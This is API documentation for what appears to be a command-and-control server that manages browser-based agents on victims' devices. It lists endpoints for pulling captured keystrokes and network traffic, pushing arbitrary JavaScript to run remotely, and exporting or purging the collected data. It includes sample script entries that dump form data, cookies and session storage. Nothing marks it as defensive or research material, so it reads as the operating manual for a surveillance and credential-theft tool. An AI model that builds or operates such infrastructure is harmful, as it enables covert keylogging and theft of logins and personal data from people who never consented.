# C2 Server API Documentation

## Introduction

This document provides a complete specification for the HTTP API endpoints exposed by the C2 server. The API is used by the front-end dashboard to retrieve agent data and issue commands.

-   **Base URL:** All endpoint paths are relative to the server's base URL.
    -   **Cloud Example:** `https://your-app-name.onrender.com`
-   **Authentication:** The current version of the API does not implement an authentication layer.
-   **Content-Type:** All `POST` requests must have a `Content-Type` header of `application/json`.

---

## **Data Retrieval Endpoints**

### `GET /api/scripts`

Retrieves the list of all pre-defined scripts available on the server.

-   **Description:** Fetches the entire script library that the dashboard can use to populate the "Run Pre-defined Script" dropdown.
-   **URL Parameters:** None
-   **Request Body:** None
-   **Success Response (`200 OK`):**
    -   Returns a JSON array of script objects.
        ```json
        [
          {
            "id": 1,
            "title": "Extract All Form Data (Sensitive)",
            "script": "return JSON.stringify(Array.from(document.forms)...)"
          },
          {
            "id": 2,
            "title": "Dump Session/Local Storage/Cookies",
            "script": "return JSON.stringify({cookies: document.cookie...})"
          }
        ]
        ```

---

### `GET /api/devices/:name/network`

Retrieves the most recent 200 network traffic entries for a specified device.

-   **Description:** Fetches a chronological list of network requests and responses captured by the agent.
-   **URL Parameters:**
    -   `:name` (string, **required**) - The unique name of the device (e.g., `Zeus-123`).
-   **Success Response (`200 OK`):**
    -   Returns a JSON array of network log objects.
-   **Error Response (`500 Internal Server Error`):**
    -   Occurs if there is a database error during retrieval.

---

### `GET /api/devices/:name/keystrokes`

Retrieves all captured keystrokes for a specified device, formatted as a plain text log.

-   **Description:** Fetches the complete keystroke history for the agent, formatted for easy reading.
-   **URL Parameters:**
    -   `:name` (string, **required**) - The unique name of the device.
-   **Success Response (`200 OK`):**
    -   Returns a `text/plain` payload containing the formatted keystroke log.
-   **Error Response (`500 Internal Server Error`):**
    -   Occurs if there is a database error during retrieval.

---

### `GET /api/devices/:name/activity`

Retrieves the most recent 50 command and activity log entries for a specified device.

-   **Description:** Fetches the history of commands sent to the agent and their results.
-   **URL Parameters:**
    -   `:name` (string, **required**) - The unique name of the device.
-   **Success Response (`200 OK`):**
    -   Returns a JSON array of activity log objects.
        ```json
        [
          {
            "_id": "64c5d2e1f3a4b5c6d7e8f9a0",
            "deviceName": "Zeus-123",
            "timestamp": "2025-07-29T18:30:57.123Z",
            "commandType": "RUN_SCRIPT",
            "scriptTitle": "Custom Script",
            "status": "Completed",
            "isError": false,
            "result": "Page title is 'Example Domain'"
          }
        ]
        ```
-   **Error Response (`500 Internal Server Error`):**
    -   Occurs if there is a database error during retrieval.

---

## **Command & Action Endpoints**

### `POST /api/commands/run-script`

Sends a script payload to a device for remote execution. The command will be queued if the device is offline.

-   **Request Body:**
    ```json
    {
      "deviceName": "Zeus-123",
      "scriptContent": "return document.title;",
      "scriptTitle": "Get Page Title"
    }
    ```
-   **Responses:**
    -   `200 OK`: Command was successfully sent to an **online** device.
    -   `202 Accepted`: The device is **offline**, and the command has been successfully queued for later delivery.
    -   `400 Bad Request`: The `deviceName` or `scriptContent` field is missing from the request body.

---

### `POST /api/commands/export-data`

Initiates a server-side process to export all data for a specified device into multiple file formats.

-   **Request Body:**
    ```json
    {
      "deviceName": "Zeus-123"
    }
    ```
-   **Responses:**
    -   `200 OK`: The export process was successful. The response body contains a list of generated filenames.
        ```json
        {
          "message": "Archived 150 events and 2048 keystrokes.",
          "files": [
            "Zeus-123_2025-08-01T10-30-00.json",
            "Zeus-123_2025-08-01T10-30-00.csv",
            "Zeus-123_2025-08-01T10-30-00.har",
            "Zeus-123_2025-08-01T10-30-00_keylog.txt"
          ]
        }
        ```
    -   `400 Bad Request`: The `deviceName` field is missing.
    -   `404 Not Found`: No data was found in the database for the specified device.
    -   `500 Internal Server Error`: The export process failed due to a server-side error.

---

### `POST /api/commands/purge-device`

**DANGEROUS ACTION.** Permanently deletes all data associated with a device (network logs, keystrokes, and activity history). **This cannot be undone.**

-   **Request Body:**
    ```json
    {
      "deviceName": "Zeus-123"
    }
    ```
-   **Responses:**
    -   `200 OK`: All data for the device was successfully purged from the database.
    -   `400 Bad Request`: The `deviceName` field is missing.
    -   `500 Internal Server Error`: The purge process failed due to a database error.

---

## **File Download Endpoint**

### `GET /exports/:filename`

Downloads a data file that was previously generated by the export command.

-   **Description:** This endpoint serves static files from the `exports` directory on the server.
-   **URL Parameters:**
    -   `:filename` (string, **required**) - The exact filename returned by the `POST /api/commands/export-data` endpoint.
-   **Success Response (`200 OK`):**
    -   Triggers a file download of the requested archive in the browser.
-   **Error Response (`404 Not Found`):**
    -   Occurs if the requested filename does not exist on the server.